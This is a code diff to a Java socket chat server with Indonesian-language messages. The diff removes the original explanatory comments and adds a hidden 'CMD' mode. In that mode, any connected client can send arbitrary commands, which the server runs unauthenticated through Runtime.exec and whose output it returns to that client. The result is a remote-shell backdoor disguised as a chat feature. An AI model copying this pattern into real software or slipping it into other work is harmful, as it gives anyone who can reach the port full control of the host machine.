@@ -1,30 +1,23 @@
-// Server.java
-
 import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.PrintWriter;
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.InputStreamReader;
 import java.io.OutputStream;
-import java.io.PrintWriter;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.HashSet;
 import java.util.Set;
 
 public class Server {
-
-    // Menentukan port yang akan digunakan oleh server
     private static final int PORT = 7890;
-
-    // Membuat Set untuk menyimpan PrintWriter dari setiap client yang terhubung
     private static Set<PrintWriter> clientWriters = new HashSet<>();
 
     public static void main(String[] args) {
         System.out.println("Server Aktif");
-        
+
         try (ServerSocket listener = new ServerSocket(PORT)) {
             while (true) {
-                // Menerima koneksi dari client baru dan menjalankan thread ClientHandler untuk menghandle koneksi tersebut
                 new ClientHandler(listener.accept()).start();
             }
         } catch (IOException e) {
@@ -32,11 +25,11 @@ public class Server {
         }
     }
 
-    // Kelas ClientHandler yang merupakan turunan dari Thread dan digunakan untuk menghandle koneksi dengan setiap client
     private static class ClientHandler extends Thread {
         private Socket socket;
         private PrintWriter out;
         private String nickname;
+        private boolean inCMDMode = false;
 
         public ClientHandler(Socket socket) {
             this.socket = socket;
@@ -45,25 +38,35 @@ public class Server {
         @Override
         public void run() {
             try {
-                // Membuka input stream dan output stream untuk berkomunikasi dengan client
                 InputStream input = socket.getInputStream();
                 BufferedReader reader = new BufferedReader(new InputStreamReader(input));
                 OutputStream output = socket.getOutputStream();
                 out = new PrintWriter(output, true);
 
                 synchronized (clientWriters) {
-                    // Menambahkan PrintWriter ke dalam Set clientWriters agar dapat digunakan untuk broadcast pesan
                     clientWriters.add(out);
                 }
 
-                // Membaca nickname dari client
                 nickname = reader.readLine();
-                
+
                 String message;
                 while ((message = reader.readLine()) != null) {
-                    // Menampilkan pesan yang diterima dari client dan melakukan broadcast ke semua client yang terhubung
-                    System.out.println(nickname + "==> " + message);
-                    broadcastMessage(nickname + ": " + message);
+                    if (inCMDMode) {
+                        if (message.equalsIgnoreCase("exit")) {
+                            inCMDMode = false;
+                            out.println("Keluar dari mode CMD. Silakan kirim pesan biasa lagi.");
+                        } else {
+                            executeCommand(message);
+                        }
+                    } else {
+                        if (message.equalsIgnoreCase("CMD")) {
+                            inCMDMode = true;
+                            out.println("Masukkan perintah yang akan dieksekusi:");
+                        } else {
+                            System.out.println(nickname + " ==> " + message);
+                            broadcastMessage(nickname + ": " + message);
+                        }
+                    }
                 }
             } catch (IOException e) {
                 e.printStackTrace();
@@ -74,15 +77,30 @@ public class Server {
                     e.printStackTrace();
                 }
                 synchronized (clientWriters) {
-                    // Menghapus PrintWriter dari Set clientWriters setelah client terputus
                     clientWriters.remove(out);
                 }
             }
         }
 
+        private void executeCommand(String command) {
+            try {
+                if (System.getProperty("os.name").startsWith("Windows")) {
+                    command = "cmd /c " + command;
+                }
+                Process process = Runtime.getRuntime().exec(command);
+                BufferedReader commandOutput = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                String line;
+                while ((line = commandOutput.readLine()) != null) {
+                    out.println("RESPONSE: " + line);
+                }
+            } catch (IOException e) {
+                out.println("Gagal mengeksekusi perintah.");
+                e.printStackTrace();
+            }
+        }
+
         private void broadcastMessage(String message) {
             synchronized (clientWriters) {
-                // Mengirimkan pesan ke semua client yang terhubung, kecuali client pengirim pesan tersebut
                 for (PrintWriter writer : clientWriters) {
                     if (writer != out) {
                         writer.println(message);
